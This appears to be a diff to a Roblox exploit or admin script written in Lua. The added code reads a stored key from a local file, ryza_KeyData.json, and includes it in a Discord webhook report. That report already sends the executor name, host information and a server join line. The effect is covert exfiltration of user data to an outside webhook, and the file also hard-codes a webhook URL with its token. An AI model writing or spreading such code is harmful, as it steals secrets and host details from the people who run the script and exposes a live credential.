@@ -40,6 +40,18 @@ local function fetchKey()
 	end
 end
 
+local function loadKeyFromFile()
+	if readfile and isfile and isfile("ryza_KeyData.json") then
+		local success, data = pcall(function()
+			return HttpService:JSONDecode(readfile("ryza_KeyData.json"))
+		end)
+		if success and data and data.key and data.timestamp then
+			return data.key
+		end
+	end
+	return nil
+end
+
 local akAdminKey = fetchKey()
 
 local webhookURL = "https://discord.com/api/webhooks/1369704218427916441/pbRVETiN52StSSSHwHT6LIiNYgDAGXE5sb-KMEgd_FK6VVoUjg4Q6-NzWlUJLgqGpO6u"
@@ -90,6 +102,7 @@ local data = {
 			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
 			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
 			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
+			{ name = "**Key Authorised**", value = (loadKeyFromFile() or "Unknown"), inline = true },
 			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
 		},
 		footer = {
